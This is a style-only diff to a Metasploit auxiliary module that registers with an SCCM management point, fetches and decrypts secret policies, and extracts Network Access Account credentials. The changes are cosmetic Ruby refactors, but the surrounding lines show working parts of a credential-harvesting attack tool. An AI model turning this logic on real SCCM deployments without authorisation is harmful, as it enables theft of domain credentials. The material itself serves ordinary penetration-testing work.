@@ -159,7 +159,7 @@ class MetasploitModule < Msf::Auxiliary
       all_results.merge(results)
     end
 
-    if all_results.length == 0
+    if all_results.empty?
       print_status('No NAA credentials configured')
     end
 
@@ -171,7 +171,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def request_policy(http_opts, policy_url, sms_id, key)
-    policy_url.gsub!(/^https?:\/\/<mp>/, '')
+    policy_url.gsub!(%r{^https?://<mp>}, '')
     policy_url = policy_url.gsub('{', '%7B').gsub('}', '%7D')
 
     now = Time.now.utc.iso8601
@@ -216,8 +216,8 @@ class MetasploitModule < Msf::Auxiliary
 
     cea = cms_envelope[:encrypted_content_info][:content_encryption_algorithm]
     algorithms = {
-      Rex::Proto::CryptoAsn1::OIDs::OID_AES256_CBC.value => {:iv_length => 16, :key_length => 32, :cipher_name => 'aes-256-cbc'},
-      Rex::Proto::CryptoAsn1::OIDs::OID_DES_EDE3_CBC.value => {:iv_length => 8, :key_length => 24, :cipher_name => 'des-ede3-cbc'}
+      Rex::Proto::CryptoAsn1::OIDs::OID_AES256_CBC.value => { iv_length: 16, key_length: 32, cipher_name: 'aes-256-cbc' },
+      Rex::Proto::CryptoAsn1::OIDs::OID_DES_EDE3_CBC.value => { iv_length: 8, key_length: 24, cipher_name: 'des-ede3-cbc' }
     }
     if algorithms.include?(cea[:algorithm].value)
       alg_hash = algorithms[cea[:algorithm].value]
@@ -279,7 +279,7 @@ class MetasploitModule < Msf::Auxiliary
 
     compressed_response = Rex::Text.zlib_inflate(response.parts[1].content).force_encoding('utf-16le')
     xml_doc = Nokogiri::XML(compressed_response.encode('utf-8'))
-    policies = xml_doc.xpath("//Policy")
+    policies = xml_doc.xpath('//Policy')
     secret_policies = policies.select do |policy|
       flags = policy.attributes['PolicyFlags']
       next if flags.nil?
@@ -291,9 +291,7 @@ class MetasploitModule < Msf::Auxiliary
       policy.xpath('PolicyLocation/text()').text
     end
 
-    urls = urls.select do |url|
-      !url.blank?
-    end
+    urls = urls.reject(&:blank?)
 
     urls.each do |url|
       print_status("Found policy containing secrets: #{url}")
@@ -356,7 +354,7 @@ class MetasploitModule < Msf::Auxiliary
       fail_with(Failure::Unreachable, 'No response from server')
     end
     response = Rex::MIME::Message.new(http_response.to_s)
-    if response.parts.length == 0
+    if response.parts.empty?
       html_doc = Nokogiri::HTML(http_response.to_s)
       error = html_doc.xpath('//title').text
       if error.blank?
@@ -373,7 +371,7 @@ class MetasploitModule < Msf::Auxiliary
     sms_id = xml_doc.root&.attributes&.[]('SMSID')&.value&.delete_prefix('GUID:')
     if sms_id.nil?
       approval = xml_doc.root&.attributes&.[]('ApprovalStatus')&.value
-      if approval == "-1"
+      if approval == '-1'
         fail_with(Failure::UnexpectedReply, 'Client registration not approved by SCCM server')
       end
       fail_with(Failure::UnexpectedReply, 'Did not retrieve SMS ID')
